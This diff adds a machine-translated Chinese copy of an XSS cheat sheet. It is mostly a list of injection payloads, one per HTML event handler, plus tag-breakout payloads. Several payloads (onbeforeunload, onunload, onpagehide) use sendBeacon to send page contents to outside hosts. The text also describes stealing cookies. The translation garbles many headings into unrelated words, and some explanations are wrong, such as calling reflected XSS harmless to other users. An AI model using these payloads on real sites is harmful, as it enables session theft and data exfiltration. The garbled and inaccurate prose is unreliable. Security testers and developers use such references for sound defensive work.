@@ -1,0 +1,1034 @@
+<html>
+<head>
+<title>Download XSS Cheat Sheet PDF for Quick References</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>下载XSS备忘单PDF快速参考</h1>
+<blockquote>原文：<a href="https://hackr.io/blog/xss-cheat-sheet#0001-01-01">https://hackr.io/blog/xss-cheat-sheet#0001-01-01</a></blockquote><div><div class="content">
+										<p>XSS或跨站脚本是一种注入执行，使网络应用程序的用户交互容易受到网络攻击。这可能会对网站造成严重损害，并危及网络安全。跨站点脚本(XSS)仍然是当今在线应用程序中检测到的最普遍的安全缺陷之一。因此，所有的网站开发者在创建网站时必须考虑XSS的严重性。</p>
+<p>XSS有许多命令、事件处理程序、框架、消费标签、无脚本攻击、编码和有用的属性。我们将涵盖所有这些，以及对XSS和XSS测试字符串的简要介绍，还有这张XSS备忘单。这是你的一站式商店为XSS司令部和更多。</p>
+<p><a href="https://drive.google.com/file/d/1mJFw9bAb4LBbLdzNPB-kvzUd6glxiAcP/view?usp=sharing" target="_blank" rel="noopener">点击此处</a>下载Hackr.io的XSS备忘单PDF。</p>
+<h2 id="what-is-xss">什么是XSS？</h2>
+<p>跨站点脚本(XSS)是一种注入，攻击者将脚本(通常是Javascript)注入网站。然后不处理它，允许它保留在浏览器中，允许脚本运行，就好像是管理员自己创建的一样。</p>
+
+<p>这种注入可能会改变显示、修改浏览器，甚至获取您的会话cookie并以管理员身份登录，从而使黑客能够完全访问您的计算机。</p>
+<p>之所以使用“可能”一词，是因为在XSS的脆弱性及其潜在影响方面存在许多模糊之处。把XSS缺陷看作是一种潜伏的病原体。人类感染一直处于休眠状态，直到某些东西导致它们实际出现，而XSS漏洞需要某种类型的活动，无论是社会工程还是某人访问页面并点击按钮。这可能马上发生，也可能需要一些时间。在其他方面，这增加了新的风险程度，因为如果工程师甚至不知道漏洞的存在，他们就无法设计补丁。</p>
+<h3 id="types-of-xss-attacks"><strong>XSS攻击的类型</strong></h3>
+<p>有三种类型的XSS攻击:</p>
+<ol>
+<li>反映了XSS</li>
+<li>商店XSS</li>
+<li>基于DOM的XSS</li>
+</ol>
+<p><strong>反射XSS </strong>:低严重性XSS攻击，攻击者将Javascript注入网站，但该脚本只影响他们自己的浏览器。黑客注入的任何脚本都不会伤害其他用户。</p>
+<p><strong>存储XSS </strong>:在这种XSS中，攻击者将恶意代码注入网站，然后攻击者将其保存在数据库中。每个访问此页面并向服务器发送http请求的人都会受到影响。</p>
+<p><strong> DOM XSS </strong>:在这次XSS攻击中，攻击者将Javascript代码注入html DOM。查找基于DOM的XSS需要一点时间，但是大多数网站都容易受到这种类型的XSS的攻击。高严重性的攻击，服务器不可能停止它。以下是一些影响的例子:</p>
+
+<ol>
+<li><strong>窃取认证cookies。</strong>攻击者的Javascript可以抓取整个文档cookie集合，并发送到攻击者控制的URL。这个攻击者可以冒充你(从目标网站的角度)，做任何操作(以你的身份购买、发送消息、汇款)。</li>
+<li>注入额外的HTML标签来获取更多信息。例如，银行网站上的XSS可能会创建一个SSN字段，该字段看起来与页面上的其他字段一模一样。用户可能会被骗提供个人信息。</li>
+<li><strong> XSS可以导致CSRF。一个有半透明覆盖层的页面可能会欺骗用户，让他们相信他们点击的是完全不同的东西。</strong></li>
+</ol>
+<p><a class="btn btn-primary btn-call-to-action " href="https://click.linksynergy.com/deeplink?id=jU79Zysihs4&amp;mid=39197&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Flearn-ethical-hacking-from-scratch%2F" target="_blank" rel="noopener">从头开始学习道德黑客</a></p>
+<h3 id="event-handlers"><strong>事件处理程序</strong></h3>
+<p>事件处理程序是基于事件执行特定操作的JavaScript函数。在XSS预防备忘单的这一部分，我们将介绍各种事件处理程序。</p>
+<h4 id="onanimationcancel"><strong> onanimationcancel </strong></h4>
+<p>当CSS动画被取消时激发</p>
+<pre class="language-javascript"><code>&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;xss id=x style="position:absolute;" onanimationcancel="print()"&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onanimationend"><strong> onanimationend </strong></h4>
+<p>CSS动画结束时激发</p>
+<pre class="language-javascript"><code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;xss style="animation-name:x" onanimationend="alert(1)"&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onanimationiteration"><strong> onanimationiteration </strong></h4>
+<p>CSS动画重复时激发</p>
+<pre class="language-javascript"><code>&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onanimationstart"><strong> onanimationstart </strong></h4>
+<p>当CSS动画开始时激发</p>
+<pre class="language-javascript"><code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;xss style="animation-name:x" onanimationstart="alert(1)"&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onbeforeprint"><strong> onbeforeprint </strong></h4>
+<p>在打印页面之前激发</p>
+<pre class="language-javascript"><code>&lt;body onbeforeprint=console.log(1)&gt;</code></pre>
+<h4 id="onbeforescriptexecut"><strong>onbeforescriptexcut</strong></h4>
+<p>在脚本执行前激发</p>
+<pre class="language-javascript"><code>&lt;xss onbeforescriptexecute=alert(1)&gt;&lt;script&gt;1&lt;/script&gt;</code></pre>
+<h4 id="onbeforeunload"><strong> onbeforeunload </strong></h4>
+<p>当URL改变时触发</p>
+<pre class="language-javascript"><code>&lt;body onbeforeunload=navigator.sendBeacon('//https://ssl.anonymous.net/',document.body.innerHTML)&gt;</code></pre>
+<h4 id="onbegin"><strong> onbegin </strong></h4>
+<p>当svg动画开始时启动</p>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;</code></pre>
+<h4 id="onbounce"><strong> onbounce </strong></h4>
+<p>当字幕反弹时发生</p>
+<pre class="language-javascript"><code>&lt;marquee width=1 loop=1 onbounce=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre>
+<h4 id="oncanplay"><strong> oncanplay </strong></h4>
+<p>如果资源可以使用，它将被解雇。</p>
+<pre class="language-javascript"><code>&lt;audio oncanplay=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="oncanplaythrough"><strong>在线播放</strong></h4>
+<p>当加载了足够的数据来全程播放资源时，该事件处理程序将会触发。</p>
+<pre class="language-javascript"><code>&lt;video oncanplaythrough=alert(1)&gt;&lt;source src="video.mp4" type="video/mp4"&gt;&lt;/video&gt;</code></pre>
+<h4 id="oncuechange"><strong> oncuechange </strong></h4>
+<p>字幕更改时发生</p>
+<pre class="language-javascript"><code>&lt;video controls&gt;&lt;source src=video.mp4 type=video/mp4&gt;&lt;track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --&gt; 00:00:05.000 &lt;b&gt;XSS&lt;/b&gt; "&gt;&lt;/video&gt;</code></pre>
+<h4 id="ondurationchange">波浪变化</h4>
+<p>持续时间改变时发生</p>
+<pre class="language-javascript"><code>&lt;audio controls ondurationchange=alert(1)&gt;&lt;source src=audio.mp3 type=audio/mpeg&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onend"><strong>一日和</strong></h4>
+<p>当svg动画结束时激发</p>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;animate onend=alert(1) attributeName=x dur=1s&gt;</code></pre>
+<h4 id="onended"><strong>合二为一</strong></h4>
+<p>当资源播放完毕时触发</p>
+<pre class="language-javascript"><code>&lt;audio controls autoplay onended=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onerror"><strong>一个错误</strong></h4>
+<p>当资源加载失败或导致错误时发生</p>
+<pre class="language-javascript"><code>&lt;audio src/onerror=alert(1)&gt;</code></pre>
+<h4 id="onfinish"><strong> onfinish </strong></h4>
+<p>字幕完成时触发</p>
+<pre class="language-javascript"><code>&lt;marquee width=1 loop=1 onfinish=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre>
+<h4 id="onfocus-and-onfocusin"><strong> Onfocus和onfocusin </strong></h4>
+<p>当元素有焦点时触发</p>
+<pre class="language-javascript"><code>&lt;a id=x tabindex=1 onfocus=alert(1)&gt;&lt;/a&gt;</code></pre>
+<h4 id="onhashchange"><strong> onhashchange </strong></h4>
+<p>哈希改变时触发</p>
+<pre class="language-javascript"><code>&lt;body onhashchange="print()"&gt;</code></pre>
+<h4 id="onload"><strong>加载</strong></h4>
+<p>加载元素时触发</p>
+<pre class="language-javascript"><code>&lt;body onload=alert(1)&gt;</code></pre>
+<h4 id="onloadeddata"><strong>上传数据</strong></h4>
+<p>加载第一帧时触发</p>
+<pre class="language-javascript"><code>&lt;audio onloadeddata=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+
+<p>加载元数据时触发</p>
+<pre class="language-javascript"><code>&lt;audio autoplay onloadedmetadata=alert(1)&gt; &lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onloadend"><strong>已下载</strong></h4>
+<p>当元素完成加载时激发</p>
+<pre class="language-javascript"><code>&lt;image src=image.png onloadend=alert(1)&gt;</code></pre>
+<h4 id="onloadstart"><strong> onloadstart </strong></h4>
+<p>当元素开始加载时发生</p>
+
+<pre class="language-javascript"><code>&lt;image src=image.png onloadstart=alert(1)&gt;</code></pre>
+<h4 id="onmessage"><strong> onmessage </strong></h4>
+<p>当从postMessage调用收到消息事件时发生</p>
+<pre class="language-javascript"><code>&lt;body onmessage=print()&gt;</code></pre>
+<h4 id="onpageshow"><strong> onpageshow </strong></h4>
+<p>页面显示时触发</p>
+<pre class="language-javascript"><code>&lt;body onpageshow=alert(1)&gt;</code></pre>
+<h4 id="onplay-and-onplaying"><strong> Onplay和onplaying </strong></h4>
+<p>播放资源时被激发</p>
+<pre class="language-javascript"><code>&lt;audio autoplay onplay=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onpopstate"><strong> onpopstate </strong></h4>
+<p>当历史改变时触发</p>
+<pre class="language-javascript"><code>&lt;body onpopstate=print()&gt;</code></pre>
+<h4 id="onprogress"><strong> onprogress </strong></h4>
+<p>视频/音频开始下载时触发</p>
+<pre class="language-javascript"><code>&lt;audio controls onprogress=alert(1)&gt;&lt;source src=audio.mp3 type=audio/mpeg&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onrepeat"><strong>重复一次</strong></h4>
+<p>当svg动画重复时触发</p>
+<pre class="language-javascript"><code>&lt;svg&gt;&lt;animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /&gt;</code></pre>
+<h4 id="onresize"><strong>无记忆</strong></h4>
+<p>调整窗口大小时触发</p>
+<pre class="language-javascript"><code>&lt;body onresize="print()"&gt;</code></pre>
+
+<p>当页面滚动时发生</p>
+<pre class="language-javascript"><code>&lt;body onscroll=alert(1)&gt;&lt;div style=height:1000px&gt;&lt;/div&gt;&lt;div id=x&gt;&lt;/div&gt;</code></pre>
+<h4 id="onstart"><strong> onstart </strong></h4>
+<p>字幕开始时触发</p>
+<pre class="language-javascript"><code>&lt;marquee onstart=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre>
+<h4 id="ontimeupdate"><strong> ontimeupdate </strong></h4>
+<p>当时间线改变时</p>
+
+<pre class="language-javascript"><code>&lt;audio controls autoplay ontimeupdate=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="ontoggle"><strong> ontoggle </strong></h4>
+<p>当详细信息标签展开时触发</p>
+
+<pre class="language-javascript"><code>&lt;details ontoggle=alert(1) open&gt;test&lt;/details&gt;</code></pre>
+<h4 id="ontransitioncancel"><strong>on transition取消</strong></h4>
+<p>当CSS过渡取消时激发</p>
+<pre class="language-javascript"><code>&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;xss id=x style="transition:color 10s" ontransitioncancel=print()&gt;&lt;/xss&gt;</code></pre>
+<h4 id="ontransitionend"><strong> ontransitionend </strong></h4>
+<p>当CSS转换结束时触发</p>
+<pre class="language-javascript"><code>&lt;xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1&gt;&lt;/xss&gt;</code></pre>
+<h4 id="ontransitionrun">背压运行</h4>
+<p>CSS转换开始时触发</p>
+<pre class="language-javascript"><code>&lt;style&gt;:target {transform: rotate(180deg);}&lt;/style&gt;&lt;xss id=x style="transition:transform 2s" ontransitionrun=print()&gt;&lt;/xss&gt;</code></pre>
+<h4 id="ontransitionstart"><strong> ontransitionstart </strong></h4>
+<p>当CSS转换开始时被激发</p>
+<pre class="language-javascript"><code>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;xss id=x style="transition:color 1s" ontransitionstart=alert(1)&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onunhandledrejection"><strong> onunhandledrejection </strong></h4>
+<p>承诺未兑现时触发</p>
+<pre class="language-javascript"><code>&lt;body onunhandledrejection=alert(1)&gt;&lt;script&gt;fetch('//xyz')&lt;/script&gt;</code></pre>
+<h4 id="onunload"><strong>他的上传</strong></h4>
+<p>当页面卸载时触发</p>
+<pre class="language-javascript"><code>&lt;body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)&gt;</code></pre>
+<h4 id="onwebkitanimationend"><strong> onwebkitanimationend </strong></h4>
+<p>CSS动画结束时触发</p>
+<pre class="language-javascript"><code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;xss style="animation-name:x" onwebkitanimationend="alert(1)"&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onwebkitanimationiteration"><strong>onwebkitanimationiteration</strong></h4>
+<p>当CSS动画重复时被激发</p>
+<pre class="language-javascript"><code>&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onwebkitanimationstart"><strong> onwebkitanimationstart </strong></h4>
+<p>当CSS动画开始时触发</p>
+<pre class="language-javascript"><code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;xss style="animation-name:x" onwebkitanimationstart="alert(1)"&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onwebkittransitionend"><strong> onwebkittransitionend </strong></h4>
+<p>CSS转换结束时触发</p>
+
+<pre class="language-javascript"><code>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;xss id=x style="transition:color element loses focus1s" onwebkittransitionend=alert(1)&gt;&lt;/xss&gt;</code></pre>
+<h4 id="onafterprint"><strong> onafterprint </strong></h4>
+<p>在页面打印后激发</p>
+
+<pre class="language-javascript"><code>&lt;body onafterprint=alert(1)&gt;</code></pre>
+<h4 id="onauxclick"><strong>onauxlick</strong></h4>
+<p>右键单击或使用鼠标中键时激发</p>
+<pre class="language-javascript"><code>&lt;input onauxclick=alert(1)&gt;</code></pre>
+<h4 id="onbeforecopy"><strong> onbeforecopy </strong></h4>
+<p>要求您复制一段文本</p>
+<pre class="language-javascript"><code>&lt;a onbeforecopy="alert(1)" contenteditable&gt;test&lt;/a&gt;</code></pre>
+<h4 id="onbeforecut"><strong> onbeforecut </strong></h4>
+<p>要求您剪切一段文本</p>
+<pre class="language-javascript"><code>&lt;a onbeforecut="alert(1)" contenteditable&gt;test&lt;/a&gt;</code></pre>
+<h4 id="onblur"><strong> onblur </strong></h4>
+<p>当元素失去焦点时激发</p>
+<pre class="language-javascript"><code>&lt;xss onblur=alert(1) id=x tabindex=1 style=display:block&gt;test&lt;/xss&gt;&lt;input value=clickme&gt;</code></pre>
+<h4 id="onchange"><strong> onchange </strong></h4>
+<p>需要更改值</p>
+<pre class="language-javascript"><code>&lt;input onchange=alert(1) value=xss&gt;</code></pre>
+<h4 id="onclick"><strong> onclick </strong></h4>
+<p>需要单击元素</p>
+<pre class="language-javascript"><code>&lt;xss onclick="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onclose"><strong>盎司</strong></h4>
+<p>当对话框关闭时激发</p>
+<pre class="language-javascript"><code>&lt;dialog open onclose=alert(1)&gt;&lt;form method=dialog&gt;&lt;button&gt;XSS&lt;/button&gt;&lt;/form&gt;</code></pre>
+
+<p>右键单击显示上下文菜单时触发</p>
+<pre class="language-javascript"><code>&lt;xss oncontextmenu="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="oncopy"><strong> oncopy </strong></h4>
+<p>要求你复制一段文字</p>
+<pre class="language-javascript"><code>&lt;xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block&gt;test</code></pre>
+<h4 id="oncut"><strong> oncut </strong></h4>
+<p>要求你剪下一段文字</p>
+<pre class="language-javascript"><code>&lt;xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block&gt;test</code></pre>
+<h4 id="ondblclick"><strong>波浪点击</strong></h4>
+<p>双击元素时触发</p>
+<pre class="language-javascript"><code>&lt;xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="ondrag"><strong>条约</strong></h4>
+<p>拖动元素时触发</p>
+<pre class="language-javascript"><code>&lt;xss draggable="true" ondrag="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="ondragend"><strong>不可抗力</strong></h4>
+<p>触发拖动在元素上完成</p>
+<pre class="language-javascript"><code>&lt;xss draggable="true" ondragend="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="ondragenter"><strong>反应物</strong></h4>
+<p>需要鼠标拖动</p>
+<pre class="language-javascript"><code>&lt;xss draggable="true" ondragenter="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="ondragleave"><strong>软骨组织</strong></h4>
+<p>需要鼠标拖动</p>
+<pre class="language-javascript"><code>&lt;xss draggable="true" ondragleave="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="ondragover"><strong> ondragover </strong></h4>
+<p>在元素上拖动触发</p>
+<pre class="language-javascript"><code>&lt;div draggable="true" contenteditable&gt;drag me&lt;/div&gt;&lt;xss ondragover=alert(1) contenteditable style=display:block&gt;drop here&lt;/xss&gt;</code></pre>
+<h4 id="ondragstart"><strong> ondragstart </strong></h4>
+<p>需要鼠标拖动</p>
+<pre class="language-javascript"><code>&lt;xss draggable="true" ondragstart="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="ondrop"><strong> ondrop </strong></h4>
+<p>触发了拖放可拖动元素</p>
+<pre class="language-javascript"><code>&lt;div draggable="true" contenteditable&gt;drag me&lt;/div&gt;&lt;xss ondrop=alert(1) contenteditable style=display:block&gt;drop here&lt;/xss&gt;</code></pre>
+<h4 id="onfocusout">担心</h4>
+<p>当元素失去焦点时激发</p>
+<pre class="language-javascript"><code>&lt;xss onfocusout=alert(1) id=x tabindex=1 style=display:block&gt;test&lt;/xss&gt;&lt;input value=clickme&gt;</code></pre>
+<h4 id="onfullscreenchange"><strong>信任筛选变更</strong></h4>
+<p>当视频改变全屏状态时激发</p>
+<pre class="language-javascript"><code>&lt;video onfullscreenchange=alert(1) src=validvideo.mp4 controls&gt;</code></pre>
+<h4 id="oninput"><strong> oninput </strong></h4>
+<p>需要更改值</p>
+<pre class="language-javascript"><code>&lt;input oninput=alert(1) value=xss&gt;</code></pre>
+<h4 id="oninvalid"><strong>精氨酸有效</strong></h4>
+<p>要求表单提交具有不满足其约束的元素，如必需的属性</p>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;input oninvalid=alert(1) required&gt;&lt;input type=submit&gt;</code></pre>
+<h4 id="onkeydown"><strong>叔叔家</strong></h4>
+<p>按键时触发</p>
+<pre class="language-javascript"><code>&lt;xss onkeydown="alert(1)" contenteditable style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onkeypress"><strong>有一台印刷机</strong></h4>
+<p>按键时触发</p>
+<pre class="language-javascript"><code>&lt;xss onkeypress="alert(1)" contenteditable style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onkeyup"><strong> onkeyup </strong></h4>
+<p>当释放一个键时触发</p>
+<pre class="language-javascript"><code>&lt;xss onkeyup="alert(1)" contenteditable style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmousedown">onmousedown</h4>
+<p>按下鼠标时触发</p>
+<pre class="language-javascript"><code>&lt;xss onmousedown="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmouseenter"><strong>是鼠标输入</strong></h4>
+<p>当鼠标悬停在元素上时触发</p>
+<pre class="language-javascript"><code>&lt;xss onmouseenter="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmouseleave"><strong>onous eleve</strong></h4>
+<p>当鼠标离开元素时触发</p>
+<pre class="language-javascript"><code>&lt;xss onmouseleave="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmousemove"><strong> onmousemove </strong></h4>
+<p>需要鼠标移动</p>
+<pre class="language-javascript"><code>&lt;xss onmousemove="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmouseout">onmouseout</h4>
+<p>当鼠标离开元素时触发</p>
+<pre class="language-javascript"><code>&lt;xss onmouseout="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmouseover"><strong> onmouseover </strong></h4>
+<p>需要将鼠标悬停在元素上</p>
+<pre class="language-javascript"><code>&lt;xss onmouseover="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmouseup"><strong>是mouseup </strong>的缩写</h4>
+<p>释放鼠标按钮时触发</p>
+<pre class="language-javascript"><code>&lt;xss onmouseup="alert(1)" style=display:block&gt;test&lt;/xss&gt;</code></pre>
+<h4 id="onmousewheel"><strong> onmousewheel </strong></h4>
+<p>当鼠标滚轮滚动时激发</p>
+<pre class="language-javascript"><code>&lt;xss onmousewheel=alert(1) style=display:block&gt;requires scrolling</code></pre>
+<h4 id="onmozfullscreenchange"><strong>onozfull screen change</strong></h4>
+<p>当视频更改全屏状态时激发</p>
+<pre class="language-javascript"><code>&lt;video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls&gt;</code></pre>
+<h4 id="onpagehide"><strong> onpagehide </strong></h4>
+<p>当页面更改时激发</p>
+<pre class="language-javascript"><code>&lt;body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)&gt;</code></pre>
+<h4 id="onpaste"><strong> onpaste </strong></h4>
+<p>需要你粘贴一段文字</p>
+<pre class="language-javascript"><code>&lt;a onpaste="alert(1)" contenteditable&gt;test&lt;/a&gt;</code></pre>
+<h4 id="onpause"><strong>开启原因</strong></h4>
+<p>需要单击元素才能暂停</p>
+<pre class="language-javascript"><code>&lt;audio autoplay controls onpause=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onpointerdown"><strong> onpointerdown </strong></h4>
+<p>当鼠标按下时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointerdown=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onpointerenter"><strong>on pointer输入</strong></h4>
+<p>当鼠标进入时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointerenter=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onpointerleave"><strong> onpointerleave </strong></h4>
+<p>当鼠标离开时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointerleave=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onpointermove"><strong> onpointermove </strong></h4>
+<p>当鼠标移动时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointermove=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onpointerout"><strong> onpointerout </strong></h4>
+<p>当鼠标离开时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointerout=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onpointerover"><strong> onpointerover </strong></h4>
+<p>当mouseover(鼠标指向选定的元素)事件发生时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointerover=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onpointerrawupdate"><strong> onpointerrawupdate </strong></h4>
+<p>当指针改变时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointerrawupdate=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onpointerup"><strong> onpointerup </strong></h4>
+<p>当鼠标抬起时激发</p>
+<pre class="language-javascript"><code>&lt;xss onpointerup=alert(1) style=display:block&gt;XSS&lt;/xss&gt;</code></pre>
+<h4 id="onreset"><strong>正在重置</strong></h4>
+<p>需要点击</p>
+<pre class="language-javascript"><code>&lt;form onreset=alert(1)&gt;&lt;input type=reset&gt;</code></pre>
+<h4 id="onsearch"><strong> onsearch </strong></h4>
+<p>当提交表单并且输入的类型属性为search时激发</p>
+<pre class="language-javascript"><code>&lt;form&gt;&lt;input type=search onsearch=alert(1) value="Hit return" autofocus&gt;</code></pre>
+<h4 id="onseeked"><strong>接通</strong></h4>
+<p>需要单击元素时间线</p>
+<pre class="language-javascript"><code>&lt;audio autoplay controls onseeked=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onseeking"><strong>开始</strong></h4>
+<p>需要单击元素时间线</p>
+<pre class="language-javascript"><code>&lt;audio autoplay controls onseeking=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onselect"><strong>on选择</strong></h4>
+<p>要求您选择文本</p>
+<pre class="language-javascript"><code>&lt;input onselect=alert(1) value="XSS" autofocus&gt;</code></pre>
+<h4 id="onselectionchange"><strong> onselectionchange </strong></h4>
+<p>当页面上的文本选择被更改时激发</p>
+<pre class="language-javascript"><code>&lt;body onselectionchange=alert(1)&gt;select some text</code></pre>
+<h4 id="onselectstart"><strong> onselectstart </strong></h4>
+<p>开始文本选择时激发</p>
+<pre class="language-javascript"><code>&lt;body onselectstart=alert(1)&gt;select some text</code></pre>
+<h4 id="onshow"><strong> onshow </strong></h4>
+<p>显示火灾上下文菜单</p>
+<pre class="language-javascript"><code>&lt;div contextmenu=xss&gt;&lt;p&gt;Right click&lt;menu type=context id=xss onshow=alert(1)&gt;&lt;/menu&gt;&lt;/div&gt;</code></pre>
+<h4 id="onsubmit"><strong> onsubmit </strong></h4>
+<p>需要提交表单</p>
+<pre class="language-javascript"><code>&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;</code></pre>
+<h4 id="ontouchend"><strong> ontouchend </strong></h4>
+<p>当触摸屏，仅移动设备</p>
+<pre class="language-javascript"><code>&lt;body ontouchend=alert(1)&gt;</code></pre>
+<h4 id="ontouchmove"><strong>触摸移动</strong></h4>
+<p>当触摸屏幕并移动时触发，仅移动设备</p>
+<pre class="language-javascript"><code>&lt;body ontouchmove=alert(1)&gt;</code></pre>
+<h4 id="ontouchstart"><strong> ontouchstart </strong></h4>
+<p>触摸屏幕时触发，仅限移动设备</p>
+<pre class="language-javascript"><code>&lt;body ontouchstart=alert(1)&gt;</code></pre>
+<h4 id="onvolumechange"><strong> onvolumechange </strong></h4>
+<p>需要音量调节</p>
+<pre class="language-javascript"><code>&lt;audio autoplay controls onvolumechange=alert(1)&gt;&lt;source src="audio.wav" type="audio/wav"&gt;&lt;/audio&gt;</code></pre>
+<h4 id="onwheel"><strong>车轮上</strong></h4>
+<p>使用鼠标滚轮时激发</p>
+<pre class="language-javascript"><code>&lt;body onwheel=alert(1)&gt;</code></pre>
+
+<p>接下来，在我们的XSS注射备忘单上，我们将带您浏览不同的消费标签。</p>
+<h4 id="noembed-consuming-tag"><strong>不嵌入消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;noembed&gt;&lt;img title="&lt;/noembed&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/noembed&gt;</code></pre>
+<h4 id="noscript-consuming-tag"><strong>无脚本消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;noscript&gt;&lt;img title="&lt;/noscript&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/noscript&gt;</code></pre>
+<h4 id="style-consuming-tag"><strong>风格消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;style&gt;&lt;img title="&lt;/style&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/style&gt;</code></pre>
+<h4 id="script-consuming-tag"><strong>脚本消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;script&gt;&lt;img title="&lt;/script&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/script&gt;</code></pre>
+<h4 id="iframe-consuming-tag"><strong> iframe消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;iframe&gt;&lt;img title="&lt;/iframe&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/iframe&gt;</code></pre>
+<h4 id="xmp-consuming-tag"><strong> xmp消费标签</strong></h4>
+<pre class="language-javascript"><code>&lt;xmp&gt;&lt;img title="&lt;/xmp&gt;&lt;img src onerror=alert(1)&gt;"&gt;&lt;/xmp&gt;</code></pre>
